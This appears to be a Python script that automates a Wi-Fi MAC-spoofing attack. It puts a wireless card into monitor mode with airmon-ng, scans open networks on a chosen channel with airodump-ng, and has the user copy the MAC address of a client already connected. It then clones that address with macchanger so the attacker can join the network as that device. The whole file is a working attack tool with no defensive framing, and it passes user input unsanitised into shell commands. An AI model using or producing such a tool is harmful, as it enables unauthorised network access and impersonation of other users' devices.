import subprocess
import time
import  os
subprocess.run("clear", shell=True)
subprocess.call(["ifconfig"])

while True:
    try:
        wcard = input("Type WIFI CARD :  ")
        subprocess.run("airmon-ng start "+wcard , shell=True)
        subprocess.call(["ifconfig"])
        print("WIFI CARD Set to the Monitor Mode")
    except ValueError:
        print("NUMBERS!")
    except KeyboardInterrupt:
        print("Breaked! Monitor STOPED! ")
    try:
        wcardmon = input("Type Monitor Interface :")
        print("Monitor will start to check WIFI a few seconds")
        time.sleep(3)
        subprocess.run("airodump-ng "+wcardmon, shell=True)
    except KeyboardInterrupt:
        print("Breaked!")
        channel = input("Spesifcy Public WIFI Channel : ")
    try:
        subprocess.call("airodump-ng " + wcardmon + " -c " + channel + " --encrypt OPN", shell=True)
    except KeyboardInterrupt:
        print("COPY the MAC connected to Router Device ")
        time.sleep(2)
        print("Wcard Monitor is going down for MAC CHANGE")
        time.sleep(2)
        subprocess.call("airmon-ng stop "+wcardmon , shell=True )
        print("Monitor STOPED")
        print("WCARD STOPED")
        mac = input("Mac Adress : ")
        subprocess.call("ifconfig "+ wcard + " down ", shell=True)
        subprocess.call("macchanger " + wcard + " -m "+ mac , shell=True)
        subprocess.call("ifconfig " + wcard + " up ", shell=True)
        print("Will be setting....")
        time.sleep(2)
        print("ALL DONE - TRY to Connect Netwrok With new MAC")
        exit()
